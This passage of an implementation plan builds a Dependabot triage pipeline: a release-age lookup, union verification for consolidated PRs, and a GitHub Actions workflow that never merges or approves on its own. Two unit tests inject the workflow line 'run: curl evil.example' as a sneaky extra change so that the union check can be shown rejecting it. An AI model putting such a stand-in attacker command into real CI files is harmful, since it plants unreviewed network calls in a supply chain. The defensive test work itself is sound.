Run: `pytest tests/scripts/test_dep_triage_collect.py -v --no-cov`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
black scripts/security/dep_triage_collect.py tests/scripts/test_dep_triage_collect.py
flake8 scripts/security/dep_triage_collect.py tests/scripts/test_dep_triage_collect.py
git add scripts/security/dep_triage_collect.py tests/scripts/test_dep_triage_collect.py
git commit -m "feat: add dependabot triage snapshot collector"
```

---

### Task 10: Release-age lookup

Populates the cooldown input, which is the supply-chain control.

**Files:**
- Modify: `scripts/security/dep_triage_collect.py`
- Modify: `tests/scripts/test_dep_triage_collect.py`

**Interfaces:**
- Consumes: `build_snapshot` from Task 9.
- Produces: `release_age_days(ecosystem, package, version, now, fetch) -> float | None`.

- [ ] **Step 1: Write the failing test**

```python
from datetime import datetime, timezone


def test_release_age_days_computes_from_upload_time():
    now = datetime(2026, 9, 19, tzinfo=timezone.utc)

    def fake_fetch(url):
        return {"urls": [{"upload_time_iso_8601": "2026-09-09T00:00:00Z"}]}

    age = dc.release_age_days("pip", "pydantic", "2.13.5", now, fake_fetch)
    assert age == pytest.approx(10.0, abs=0.1)


def test_release_age_days_returns_none_on_fetch_failure():
    def boom(url):
        raise OSError("network down")

    assert dc.release_age_days("pip", "x", "1.0.0", datetime.now(timezone.utc),
                               boom) is None


def test_release_age_days_unknown_ecosystem_returns_none():
    assert dc.release_age_days("docker", "x", "1", datetime.now(timezone.utc),
                               lambda u: {}) is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage_collect.py -k release_age -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'release_age_days'`

- [ ] **Step 3: Write minimal implementation**

```python
import urllib.request
from typing import Callable

_VERSION_CLEAN = re.compile(r"[^\d.].*$")


def _fetch_json(url: str) -> dict:
    """Fetch and parse a JSON document over HTTPS."""
    with urllib.request.urlopen(url, timeout=20) as response:
        return json.loads(response.read().decode("utf-8"))


def release_age_days(
    ecosystem: str,
    package: str,
    version: str,
    now: datetime,
    fetch: Callable[[str], dict] = _fetch_json,
) -> float | None:
    """Return the age in days of a package version, or None if unavailable.

    Returns None rather than raising on any lookup failure. An unknown age is
    treated as held by ``rule_cooldown``, so failure is conservative.
    """
    clean = _VERSION_CLEAN.sub("", (version or "").lstrip("^~>=< "))
    if not clean or not package:
        return None
    try:
        if ecosystem == "pip":
            data = fetch(f"https://pypi.org/pypi/{package}/{clean}/json")
            stamps = [
                u["upload_time_iso_8601"]
                for u in data.get("urls", [])
                if u.get("upload_time_iso_8601")
            ]
            if not stamps:
                return None
            released = datetime.fromisoformat(
                min(stamps).replace("Z", "+00:00")
            )
        elif ecosystem == "npm":
            data = fetch(f"https://registry.npmjs.org/{package}")
            stamp = data.get("time", {}).get(clean)
            if not stamp:
                return None
            released = datetime.fromisoformat(stamp.replace("Z", "+00:00"))
        else:
            return None
    except Exception:
        return None
    return (now - released).total_seconds() / 86400.0
```

Wire it into `main` by replacing `release_ages={}` with:

```python
    now = datetime.now(timezone.utc)
    release_ages: dict[str, float] = {}
    for pr in prs:
        package, _, new = parse_bump_title(pr["title"])
        if package and package not in release_ages:
            age = release_age_days(
                infer_ecosystem(pr["files"]), package, new, now
            )
            if age is not None:
                release_ages[package] = age
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage_collect.py -v --no-cov`
Expected: PASS (14 tests)

- [ ] **Step 5: Commit**

```bash
black scripts/security/dep_triage_collect.py tests/scripts/test_dep_triage_collect.py
flake8 scripts/security/dep_triage_collect.py tests/scripts/test_dep_triage_collect.py
git add -u
git commit -m "feat: add release-age lookup for dependabot cooldown gating"
```

---

### Task 11: Coupled-set consolidation builder

**Files:**
- Create: `scripts/security/dep_triage_consolidate.py`
- Create: `tests/scripts/test_dep_triage_consolidate.py`

**Interfaces:**
- Consumes: `Decision`, `CODE_COUPLED` from `dep_triage`.
- Produces: `added_lines(diff) -> set[str]`, `verify_union(member_diffs, combined_diff) -> tuple[bool, set[str], set[str]]`, `branch_name(family, version) -> str`.

- [ ] **Step 1: Write the failing test**

```python
"""Tests for coupled-set consolidation verification."""

from scripts.security import dep_triage_consolidate as dcon

MEMBER_A = """\
--- a/.github/workflows/codeql.yml
+++ b/.github/workflows/codeql.yml
@@ -1,3 +1,3 @@
-      uses: github/codeql-action/init@aaa # v4.37.9
+      uses: github/codeql-action/init@bbb # v4.38.0
"""

MEMBER_B = """\
--- a/.github/workflows/codeql.yml
+++ b/.github/workflows/codeql.yml
@@ -10,3 +10,3 @@
-      uses: github/codeql-action/analyze@aaa # v4.37.9
+      uses: github/codeql-action/analyze@bbb # v4.38.0
"""


def test_added_lines_extracts_only_additions():
    assert dcon.added_lines(MEMBER_A) == {
        "uses: github/codeql-action/init@bbb # v4.38.0"
    }


def test_added_lines_ignores_file_headers():
    assert not any("+++" in line for line in dcon.added_lines(MEMBER_A))


def test_verify_union_accepts_exact_union():
    combined = MEMBER_A + MEMBER_B
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], combined)
    assert ok and not missing and not extra


def test_verify_union_rejects_missing_member_change():
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], MEMBER_A)
    assert not ok
    assert "uses: github/codeql-action/analyze@bbb # v4.38.0" in missing


def test_verify_union_rejects_unexplained_extra_change():
    sneaky = MEMBER_A + MEMBER_B + (
        "--- a/x\n+++ b/x\n@@ -1 +1 @@\n+      run: curl evil.example\n"
    )
    ok, missing, extra = dcon.verify_union([MEMBER_A, MEMBER_B], sneaky)
    assert not ok
    assert "run: curl evil.example" in extra


def test_branch_name_is_slugified():
    assert dcon.branch_name("github/codeql-action", "4.38.0") == (
        "dep-consolidate/github-codeql-action-4.38.0"
    )
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage_consolidate.py -v --no-cov`
Expected: FAIL with `ModuleNotFoundError`

- [ ] **Step 3: Write minimal implementation**

```python
# scripts/security/dep_triage_consolidate.py
"""Verification helpers for coupled-set consolidation.

When several Dependabot PRs must land together, the consolidation branch has to
contain exactly the union of their changes -- no more, no less. An extra added
line in a consolidation branch is an unreviewed change riding along with an
approved one, so the union check is a security control, not a convenience.
"""

from __future__ import annotations

import re

_SLUG = re.compile(r"[^a-z0-9.]+")


def added_lines(diff: str) -> set[str]:
    """Return the set of content lines added by a unified diff."""
    out: set[str] = set()
    for line in diff.splitlines():
        if line.startswith("+++"):
            continue
        if line.startswith("+"):
            stripped = line[1:].strip()
            if stripped:
                out.add(stripped)
    return out


def verify_union(
    member_diffs: list[str], combined_diff: str
) -> tuple[bool, set[str], set[str]]:
    """Check a consolidation diff equals the union of its members' additions.

    Returns (ok, missing, extra). ``missing`` are member additions absent from
    the consolidation; ``extra`` are additions present in the consolidation that
    no member PR introduced.
    """
    expected: set[str] = set()
    for diff in member_diffs:
        expected |= added_lines(diff)
    actual = added_lines(combined_diff)
    missing = expected - actual
    extra = actual - expected
    return (not missing and not extra, missing, extra)


def branch_name(family: str, version: str) -> str:
    """Build the consolidation branch name for a family and target version."""
    slug = _SLUG.sub("-", family.lower()).strip("-")
    return f"dep-consolidate/{slug}-{version}"
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage_consolidate.py -v --no-cov`
Expected: PASS (6 tests)

- [ ] **Step 5: Commit**

```bash
black scripts/security/dep_triage_consolidate.py tests/scripts/test_dep_triage_consolidate.py
flake8 scripts/security/dep_triage_consolidate.py tests/scripts/test_dep_triage_consolidate.py
git add scripts/security/dep_triage_consolidate.py tests/scripts/test_dep_triage_consolidate.py
git commit -m "feat: add coupled-set consolidation union verification"
```

---

### Task 12: Workflow and Dependabot coverage gap

**Files:**
- Create: `.github/workflows/dependabot-triage.yml`
- Modify: `.github/dependabot.yml`

**Interfaces:**
- Consumes: the CLIs from Tasks 8, 9, 10, 11.
- Produces: the weekly report PR.

- [ ] **Step 1: Close the Dependabot coverage gap**

`deploy/docker/memory-service/requirements.txt` is watched by nothing today, because the pip ecosystem is scoped to `directory: "/"`. Replace that entry's `directory:` key with `directories:`:

```yaml
  # Python dependencies
  - package-ecosystem: "pip"
    directories:
      - "/"
      # deploy/docker/memory-service/requirements.txt was previously unwatched:
      # the single "/" scope does not reach nested requirements files, so this
      # image's dependencies were never updated.
      - "/deploy/docker/memory-service"
```

Leave the `schedule`, `open-pull-requests-limit`, `labels`, `groups` and `ignore` keys of that entry unchanged.

- [ ] **Step 2: Validate the config parses**

Run: `python -c "import yaml,pathlib; yaml.safe_load(pathlib.Path('.github/dependabot.yml').read_text())" && echo OK`
Expected: `OK`

- [ ] **Step 3: Commit the config fix**

```bash
git add .github/dependabot.yml
git commit -m "fix: watch memory-service requirements with dependabot"
```

- [ ] **Step 4: Write the workflow**

```yaml
name: Dependabot Triage

# Classifies open Dependabot PRs, proves the safe subset resolves and tests as a
# batch, and opens a weekly report PR for operator review.
#
# This workflow NEVER merges or approves a pull request. Operator review and
# merge remain required, consistent with dependency-risk-audit.yml and the
# main-protection ruleset.
#
# Trigger is schedule/workflow_dispatch only. `pull_request_target` is
# deliberately NOT used: combined with a checkout of PR head it grants a
# write-scoped token to untrusted code.

on:
  schedule:
    # 16:00 UTC Monday -- after Dependabot opens PRs and after the 14:00 audit.
    - cron: '0 16 * * 1'
  workflow_dispatch:

permissions: {}

concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false

jobs:
  classify:
    name: Classify open Dependabot PRs
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    permissions:
      contents: read
      pull-requests: read
    outputs:
      candidates: ${{ steps.classify.outputs.candidates }}
    steps:
      - name: Checkout repository
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: '3.11'

      - name: Collect snapshot
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          python -m scripts.security.dep_triage_collect \
            --repo "${{ github.repository }}" \
            --output snapshot.json \
            --required-check "Python Quality & Tests" \
            --required-check "Analyze (python)" \
            --required-check "Analyze (javascript-typescript)" \
            --required-check "Analyze (actions)"

      - name: Classify
        id: classify
        run: |
          python -m scripts.security.dep_triage \
            --snapshot snapshot.json \
            --output triage-report.md \
            --decisions decisions.json
          python - <<'PY' >> "$GITHUB_OUTPUT"
          import json
          data = json.load(open("decisions.json"))
          nums = [d["number"] for d in data["decisions"]
                  if d["code"] == "candidate"]
          print("candidates=" + json.dumps(nums))
          PY

      - name: Upload triage artifacts
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7
        with:
          name: triage
          path: |
            snapshot.json
            decisions.json
            triage-report.md

  batch-proof:
    name: Prove candidate batch
    needs: classify
    if: needs.classify.outputs.candidates != '[]'
    runs-on: ubuntu-24.04
    timeout-minutes: 45
    permissions:
      contents: read
    steps:
      - name: Checkout main
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: '3.11'

      - name: Build candidate integration branch
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          CANDIDATES: ${{ needs.classify.outputs.candidates }}
        run: |
          set -euo pipefail
          git config user.name "aura-ci"
          git config user.email "ci@aenealabs.com"
          git switch -c "dep-triage/candidate-${GITHUB_RUN_ID}"
          for pr in $(echo "$CANDIDATES" | python -c \
              'import json,sys; print(" ".join(map(str, json.load(sys.stdin))))'); do
            git fetch origin "pull/${pr}/head:pr-${pr}"
            if ! git merge --no-edit "pr-${pr}"; then
              echo "::warning::PR #${pr} conflicts with the batch; excluding it"
              git merge --abort
            fi
          done

      - name: Prove dependency resolution
        run: |
          set -euo pipefail
          for req in requirements.txt requirements-api.txt \
                     requirements-test-extras.txt requirements-agents.txt; do
            [ -f "$req" ] || continue
            echo "::group::resolve $req"
            python -m pip install --dry-run --quiet --report /dev/null -r "$req"
            echo "::endgroup::"
          done

      - name: Prove npm resolution
        # `--legacy-peer-deps` is mandatory in frontend/, not a shortcut: the
        # eslint-plugin-react peer cap on eslint@^9.7 makes a plain `npm ci`
        # fail outright. See frontend/CLAUDE.md and code-quality.yml.
        #
        # Consequence, recorded deliberately: the flag silences peer-dependency
        # conflicts globally, so this step is weaker assurance than it looks and
        # would NOT on its own have caught PR #443's vitest/coverage-v8 skew.
        # Coupled-family detection (R5) is the primary control for that class,
        # and it catches #443 deterministically before the proof ever runs.
        run: |
          set -euo pipefail
          for dir in frontend sdk/typescript; do
            [ -f "$dir/package.json" ] || continue
            echo "::group::npm ci $dir"
            (cd "$dir" && npm ci --legacy-peer-deps)
            echo "::endgroup::"
          done

      - name: Run test suite
        run: |
          python -m pip install --quiet -r requirements.txt
          pytest -q

  report:
    name: Publish triage report
    needs: [classify, batch-proof]
    if: always() && needs.classify.result == 'success'
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    permissions:
      contents: read
      issues: write
    steps:
      - name: Checkout repository
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: '3.11'

      - name: Download triage artifacts
        uses: actions/download-artifact@018cc2cf5baa6db3ef3c5f8a56943fffe632ef53 # v6
        with:
          name: triage

      - name: Publish the rolling triage issue
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PROOF: ${{ needs.batch-proof.result }}
          CANDIDATES: ${{ needs.classify.outputs.candidates }}
        run: |
          set -euo pipefail
          # Only a green batch proof promotes candidates to merge-safe. Any
          # other outcome leaves them as candidates, so a skipped or failed
          # proof never reports anything as mergeable.
          if [ "$PROOF" = "success" ]; then
            python -m scripts.security.dep_triage \
              --snapshot snapshot.json \
              --output triage-report.md \
              --proved "$CANDIDATES"
          fi
          printf '\n> Batch proof result: %s\n' "$PROOF" >> triage-report.md

          # The report is a rolling issue rewritten in place, not a weekly PR.
          # An issue needs no approval to update, so the team carries no
          # recurring merge chore for a document that only offers advice.
          title="Dependabot triage"
          number="$(gh issue list --state open --label automated \
            --search "$title in:title" --json number,title \
            --jq "[.[] | select(.title == \"$title\")] | first | .number // empty")"
          if [ -n "$number" ]; then
            gh issue edit "$number" --body-file triage-report.md
            echo "updated issue #${number}"
          else
            gh issue create --title "$title" \
              --body-file triage-report.md \
              --label dependencies --label automated
          fi
```

- [ ] **Step 5: Validate the workflow parses and passes lint**

```bash
python -c "import yaml,pathlib; yaml.safe_load(pathlib.Path('.github/workflows/dependabot-triage.yml').read_text())" && echo YAML-OK
SKIP=no-commit-to-branch pre-commit run --files .github/workflows/dependabot-triage.yml .github/dependabot.yml
```
Expected: `YAML-OK` and all hooks pass.

- [ ] **Step 6: Dry-run the pipeline locally against the fixture**

```bash
python -m scripts.security.dep_triage \
  --snapshot tests/fixtures/dep_triage/batch_2026_09_19.json \
  --output /tmp/triage-report.md --decisions /tmp/decisions.json
cat /tmp/triage-report.md
```
Expected: report with #386 under Excluded, #442/#443/#450/#452 under Coupled sets, #439/#446 under Candidates.

- [ ] **Step 7: Commit**

```bash
git add .github/workflows/dependabot-triage.yml
git commit -m "feat: add dependabot triage workflow"
```

- [ ] **Step 8: Full verification before opening the PR**

```bash
pytest tests/scripts/test_dep_triage.py tests/scripts/test_dep_triage_collect.py \
       tests/scripts/test_dep_triage_consolidate.py -v
SKIP=no-commit-to-branch pre-commit run --all-files
```
Expected: all tests pass; coverage at or above 70%; all hooks pass.

---

### Task 13: Consolidation runner and workflow job

Task 11 provides the union verification but nothing invokes it. This task
delivers spec Section 3: one consolidated PR per coupled family. The git and
`gh` calls go through an injectable runner so the orchestration is unit-testable
without touching the network.

**Files:**
- Modify: `scripts/security/dep_triage_consolidate.py`
- Modify: `tests/scripts/test_dep_triage_consolidate.py`
- Modify: `.github/workflows/dependabot-triage.yml`

**Interfaces:**
- Consumes: `verify_union`, `branch_name`, `added_lines` (Task 11); `decisions.json` and `snapshot.json` written by Tasks 8 and 9.
- Produces: `families_from_decisions(decisions) -> dict[str, list[int]]`, `consolidation_body(family, version, members) -> str`, `consolidate_family(family, version, members, run) -> tuple[bool, str]`, `main(argv) -> int`.

- [ ] **Step 1: Write the failing test**

```python
def test_families_from_decisions_groups_coupled_members():
    decisions = [
        {"number": 452, "code": "coupled", "family": "github/codeql-action"},
        {"number": 450, "code": "coupled", "family": "github/codeql-action"},
        {"number": 442, "code": "coupled", "family": "npm:/frontend:vitest"},
        {"number": 439, "code": "candidate", "family": None},
    ]
    families = dcon.families_from_decisions(decisions)
    assert families["github/codeql-action"] == [450, 452]
    assert families["npm:/frontend:vitest"] == [442]
    assert 439 not in [n for v in families.values() for n in v]


def test_families_from_decisions_ignores_non_coupled():
    assert dcon.families_from_decisions(
        [{"number": 1, "code": "merge-safe", "family": None}]
    ) == {}


def test_consolidation_body_names_every_member_and_the_coupling():
    body = dcon.consolidation_body(
        "github/codeql-action", "4.38.0", [450, 452, 453, 454]
    )
    for number in (450, 452, 453, 454):
        assert f"#{number}" in body
    assert "together" in body.lower()
    assert "4.38.0" in body


def test_consolidation_body_does_not_claim_members_were_closed():
    body = dcon.consolidation_body("github/codeql-action", "4.38.0", [450, 452])
    assert "closed" not in body.lower()
    assert "left open" in body.lower()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage_consolidate.py -k "families or body" -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'families_from_decisions'`

- [ ] **Step 3: Write minimal implementation**

```python
def families_from_decisions(decisions: list[dict]) -> dict[str, list[int]]:
    """Group coupled decisions by family, in ascending PR order."""
    families: dict[str, list[int]] = {}
    for decision in decisions:
        if decision.get("code") != "coupled":
            continue
        family = decision.get("family")
        if not family:
            continue
        families.setdefault(family, []).append(int(decision["number"]))
    return {key: sorted(value) for key, value in families.items()}


def consolidation_body(family: str, version: str, members: list[int]) -> str:
    """Build the consolidated PR body explaining why members cannot merge alone."""
    listed = ", ".join(f"#{number}" for number in sorted(members))
    return (
        f"Consolidates the `{family}` update to {version}.\n\n"
        f"Members: {listed}.\n\n"
        "These cannot be merged individually. The refs must move together, so "
        "merging any one alone leaves the repository inconsistent -- and a "
        "member can pass every check while still being unsafe by itself.\n\n"
        "The set of added lines in this branch was verified equal to the union "
        "of the member pull requests' added lines before this PR was opened.\n\n"
        "Member PRs are left open deliberately: Dependabot retires them once "
        "the version lands, and keeping them open means rejecting this "
        "consolidation does not discard the originals.\n\n"
        "Operator review and merge required. Nothing here was merged or "
        "approved automatically."
    )
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage_consolidate.py -v --no-cov`
Expected: PASS

- [ ] **Step 5: Write the failing test for the orchestration**

The runner is injected, so this test asserts the *sequence* of commands and the
union gate without any network or git access.

```python
class FakeRun:
    """Records commands; returns canned stdout per matched prefix."""

    def __init__(self, responses=None, fail_on=None):
        self.calls = []
        self.responses = responses or {}
        self.fail_on = fail_on or ()

    def __call__(self, args, capture=False):
        self.calls.append(list(args))
        joined = " ".join(args)
        for needle in self.fail_on:
            if needle in joined:
                raise dcon.CommandFailed(joined)
        for needle, out in self.responses.items():
            if needle in joined:
                return out
        return ""

    def ran(self, needle):
        return any(needle in " ".join(c) for c in self.calls)


DIFF_A = (
    "--- a/w.yml\n+++ b/w.yml\n@@ -1 +1 @@\n"
    "-      uses: github/codeql-action/init@aaa # v4.37.9\n"
    "+      uses: github/codeql-action/init@bbb # v4.38.0\n"
)
DIFF_B = (
    "--- a/w.yml\n+++ b/w.yml\n@@ -9 +9 @@\n"
    "-      uses: github/codeql-action/analyze@aaa # v4.37.9\n"
    "+      uses: github/codeql-action/analyze@bbb # v4.38.0\n"
)


def test_consolidate_family_opens_pr_when_union_matches():
    run = FakeRun(responses={
        "diff origin/main...pr-450": DIFF_A,
        "diff origin/main...pr-452": DIFF_B,
        "diff origin/main...HEAD": DIFF_A + DIFF_B,
    })
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert ok, message
    assert run.ran("switch -c dep-consolidate/github-codeql-action-4.38.0")
    assert run.ran("pr create")


def test_consolidate_family_refuses_when_union_has_extra_lines():
    """An added line no member introduced is an unreviewed change."""
    sneaky = DIFF_A + DIFF_B + (
        "--- a/x\n+++ b/x\n@@ -1 +1 @@\n+      run: curl evil.example\n"
    )
    run = FakeRun(responses={
        "diff origin/main...pr-450": DIFF_A,
        "diff origin/main...pr-452": DIFF_B,
        "diff origin/main...HEAD": sneaky,
    })
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "union" in message.lower()
    assert not run.ran("pr create")


def test_consolidate_family_aborts_on_merge_conflict():
    run = FakeRun(
        responses={"diff origin/main...pr-450": DIFF_A},
        fail_on=("merge --no-edit pr-452",),
    )
    ok, message = dcon.consolidate_family(
        "github/codeql-action", "4.38.0", [450, 452], run
    )
    assert not ok
    assert "conflict" in message.lower()
    assert run.ran("merge --abort")
    assert not run.ran("pr create")


def test_consolidate_family_never_merges_or_approves():
    run = FakeRun(responses={
        "diff origin/main...pr-450": DIFF_A,
        "diff origin/main...pr-452": DIFF_B,
        "diff origin/main...HEAD": DIFF_A + DIFF_B,
    })
    dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
    for forbidden in ("pr merge", "pr review", "pr ready"):
        assert not run.ran(forbidden), f"must never run: {forbidden}"
```

- [ ] **Step 6: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage_consolidate.py -k consolidate_family -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'CommandFailed'`

- [ ] **Step 7: Write minimal implementation**

```python
class CommandFailed(RuntimeError):
    """A subprocess command exited non-zero."""


def _run(args: list[str], capture: bool = False) -> str:
    """Execute a command, raising CommandFailed on a non-zero exit."""
    result = subprocess.run(args, capture_output=True, text=True)
    if result.returncode != 0:
        raise CommandFailed(
            f"{' '.join(args)} exited {result.returncode}: {result.stderr.strip()}"
        )
    return result.stdout if capture else ""


def consolidate_family(
    family: str,
    version: str,
    members: list[int],
    run: Callable[..., str] = _run,
) -> tuple[bool, str]:
    """Build a consolidation branch for one family and open its pull request.

    Returns (ok, message). Never merges and never approves anything: the
    consolidated PR goes through the same operator review as any other change.

    The union check is a security control. If the branch contains an added line
    that no member PR introduced, an unreviewed change would be riding along
    inside an approved one, so the function refuses to open the PR.
    """
    branch = branch_name(family, version)
    run(["git", "switch", "-c", branch, "origin/main"])

    member_diffs: list[str] = []
    for pr in members:
        run(["git", "fetch", "origin", f"pull/{pr}/head:pr-{pr}"])
        member_diffs.append(
            run(["git", "diff", f"origin/main...pr-{pr}"], capture=True)
        )
        try:
            run(["git", "merge", "--no-edit", f"pr-{pr}"])
        except CommandFailed:
            run(["git", "merge", "--abort"])
            run(["git", "switch", "main"])
            return (False, f"family {family}: PR #{pr} conflicts; skipped")

    combined = run(["git", "diff", "origin/main...HEAD"], capture=True)
    ok, missing, extra = verify_union(member_diffs, combined)
    if not ok:
        run(["git", "switch", "main"])
        return (
            False,
            f"family {family}: union mismatch; "
            f"missing={sorted(missing)} extra={sorted(extra)}",
        )

    run(["git", "push", "-u", "origin", branch, "--force"])
    run([
        "gh", "pr", "create", "--base", "main", "--head", branch,
        "--title", f"chore(deps): bump {family} to {version} across all refs",
        "--body", consolidation_body(family, version, members),
        "--label", "dependencies", "--label", "automated",
    ])
    for pr in members:
        run([
            "gh", "pr", "comment", str(pr), "--body",
            f"Superseded by the consolidated PR on `{branch}`; this PR cannot "
            "be merged on its own.",
        ])
    run(["git", "switch", "main"])
    return (True, f"family {family}: opened {branch}")
```

Add `import subprocess` and `from typing import Callable` to the module header.

- [ ] **Step 8: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage_consolidate.py -v --no-cov`
Expected: PASS

- [ ] **Step 9: Add the CLI**

```python
def main(argv: list[str] | None = None) -> int:
    """Open one consolidated PR per coupled family."""
    parser = argparse.ArgumentParser(
        description="Open consolidated PRs for coupled Dependabot families."
    )
    parser.add_argument("--decisions", type=Path, required=True,
                        help="decisions.json written by dep_triage.")
    parser.add_argument("--snapshot", type=Path, required=True,
                        help="snapshot.json, used for target versions.")
    parser.add_argument("--execute", action="store_true",
                        help="Actually create branches and PRs. Without it, "
                             "the plan is printed and nothing is changed.")
    args = parser.parse_args(argv)

    decisions = json.loads(
        args.decisions.read_text(encoding="utf-8")
    )["decisions"]
    snapshot = json.loads(args.snapshot.read_text(encoding="utf-8"))
    versions = {
        pr["number"]: pr.get("to_version", "")
        for pr in snapshot["pull_requests"]
    }

    families = families_from_decisions(decisions)
    for family, members in sorted(families.items()):
        if len(members) < 2:
            continue
        target = next(
            (versions[m] for m in members if versions.get(m)), ""
        )
        if not args.execute:
            print(f"would consolidate {family} -> {target}: {members}")
            continue
        ok, message = consolidate_family(family, target, members)
        print(message)
        if not ok:
            print(f"::warning::{message}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Add `import argparse`, `import json` and `from pathlib import Path` to the module header.

- [ ] **Step 10: Add the consolidation job to the workflow**

Insert after the `batch-proof` job in `.github/workflows/dependabot-triage.yml`.
The heavy lifting is in Python, so this job stays a single command.

```yaml
  consolidate:
    name: Open consolidated PRs for coupled families
    needs: classify
    # Staged rollout: this is the only job that writes branches, opens PRs and
    # comments on other PRs. Until it has produced a few correct consolidated
    # PRs under observation, it runs ONLY on a manual workflow_dispatch, never
    # on the weekly schedule. The classify/report path still runs weekly and
    # names any coupled family, so nothing is missed -- an operator triggers
    # the consolidation.
    #
    # To promote it to unattended weekly operation, delete this `if:` line.
    if: github.event_name == 'workflow_dispatch'
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    permissions:
      contents: write
      pull-requests: write
    steps:
      - name: Checkout repository
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: '3.11'

      - name: Download triage artifacts
        uses: actions/download-artifact@018cc2cf5baa6db3ef3c5f8a56943fffe632ef53 # v6
        with:
          name: triage

      - name: Open consolidated PRs
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          set -euo pipefail
          git config user.name "aura-ci"
          git config user.email "ci@aenealabs.com"
          python -m scripts.security.dep_triage_consolidate \
            --decisions decisions.json \
            --snapshot snapshot.json \
            --execute
```

- [ ] **Step 11: Validate and commit**

```bash
python -c "import yaml,pathlib; yaml.safe_load(pathlib.Path('.github/workflows/dependabot-triage.yml').read_text())" && echo YAML-OK
pytest tests/scripts/test_dep_triage_consolidate.py -v --no-cov
black scripts/security/dep_triage_consolidate.py tests/scripts/test_dep_triage_consolidate.py
flake8 scripts/security/dep_triage_consolidate.py tests/scripts/test_dep_triage_consolidate.py
git add -u
git commit -m "feat: open consolidated PRs for coupled dependabot families"
```

---

## Verification Checklist

- [ ] `pytest tests/scripts/test_dep_triage*.py` passes.
- [ ] Coverage for the three new modules is at or above 70%; the threshold in `pyproject.toml` is unchanged.
- [ ] `pre-commit run --all-files` passes.
- [ ] No commit message, comment, or document contains AI attribution.
- [ ] The workflow contains no `pull_request_target` trigger.
- [ ] No step in the workflow runs `gh pr merge`, `gh pr review`, or `gh pr ready`.
- [ ] `.github/dependabot.yml` still contains the `tree-sitter` ignore entry with its justification comment.
- [ ] Regression assertions hold: #386 excluded, #450 and #443 coupled despite being green, #442 flagged as suspected flake, #452 coupled, #439 and #446 candidates.
- [ ] `npm ci` in `frontend/` uses `--legacy-peer-deps` (mandatory; see frontend/CLAUDE.md).
- [ ] Every pinned action SHA resolves and its trailing version comment matches the tag it pins.
- [ ] A coupled family produces exactly one consolidated PR, and `verify_union` gates it.
